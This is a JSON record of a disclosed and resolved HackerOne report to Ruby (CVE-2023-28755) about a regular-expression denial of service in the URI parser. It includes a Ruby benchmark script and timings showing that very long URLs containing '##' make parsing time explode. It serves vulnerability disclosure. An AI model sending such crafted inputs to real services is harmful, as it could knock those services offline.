{
  "id": 1444501,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNDQ0NTAx",
  "url": "https://hackerone.com/reports/1444501",
  "title": "URI parser's RFC3986 regular expression has poor performance when there are two # characters, leading to ReDoS",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2022-01-09T14:12:19.238Z",
  "submitted_at": "2022-01-09T14:12:19.295Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "dee-see",
    "url": "/dee-see",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/220/115/9a655d51cb400a5743966e9856918ed02ee8d042_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 7724,
    "url": "https://hackerone.com/ruby",
    "handle": "ruby",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Ruby",
      "twitter_handle": "",
      "website": "https://www.ruby-lang.org",
      "about": "A Programmer's Best Friend"
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2023-28755"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2023-12-13T14:10:44.216Z",
  "bug_reporter_agreed_on_going_public_at": "2023-12-13T14:10:44.131Z",
  "team_member_agreed_on_going_public_at": "2023-12-11T22:11:34.132Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "## Summary\n\nHello team, I hope you're doing well! The `URI` parser mishandles invalid URLs that have two `#` characters. It does correctly identify that they're invalid, but the regex performs very poorly and execution time grows much faster than the string length.\n\nI found this somewhat accidentally when fuzzing for something else. I'm not sure if you care about such issues but I figured I'd report it anyway. The length of the strings required to actually cause the process to hang are very long, but it's not really an issue when the user-controlled input is sent in a request body.\n\n## Steps to reproduce\n\nRun the following script\n\n```ruby\nrequire 'benchmark'\nrequire 'uri'\n\ndef parse(n)\n  URI('https://example.com/dir/' + 'a' * n + '/##.jpg')\n  rescue URI::InvalidURIError\n  # Invalid URI because of the two #\nend\n\nn = 50000\nBenchmark.bm(7) do |x|\n  x.report('Base length') { parse(n) }\n  x.report('Length x2  ') { parse(n * 2) }\n  x.report('Length x4  ') { parse(n * 4) }\n  x.report('Length x8  ') { parse(n * 8) }\nend\n```\n\nHere's the output on my machine\n\n```plaintext\n              user     system      total        real\nBase length  1.086961   0.003059   1.090020 (  1.090500)\nLength x2    4.415046   0.000000   4.415046 (  4.416986)\nLength x4   22.021462   0.003294  22.024756 ( 22.042507)\nLength x8  122.695223   0.006653 122.701876 (122.853669)\n```\n\nWe can see the execution time is roughly quintuples when the string length only doubles.\n\nHere's my Ruby version\n\n```shell\n$ ruby -v\nruby 3.1.0p0 (2021-12-25 revision fb4df44d16) [x86_64-linux]\n```\n\n## Impact\n\nHigh resource consumption, reduced performance, denial of service",
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2024-01-10T22:11:34.221Z",
  "allow_singular_disclosure_after": -2909399.637358333,
  "singular_disclosure_allowed": true,
  "vote_count": 21,
  "voters": [
    "zy9ard3",
    "m_mlover",
    "sajid626",
    "snailgt",
    "tonly",
    "worthychunk",
    "cyberneticsx",
    "cooldude008",
    "vinayakj",
    "aleklebio7",
    "and 11 more..."
  ],
  "severity": {
    "rating": "medium",
    "score": 5.3,
    "author_type": "User",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "none",
      "user_interaction": "none",
      "scope": "unchanged",
      "confidentiality": "none",
      "integrity": "none",
      "availability": "low"
    }
  },
  "structured_scope": {
    "databaseId": 28212,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "https://github.com/ruby/ruby",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
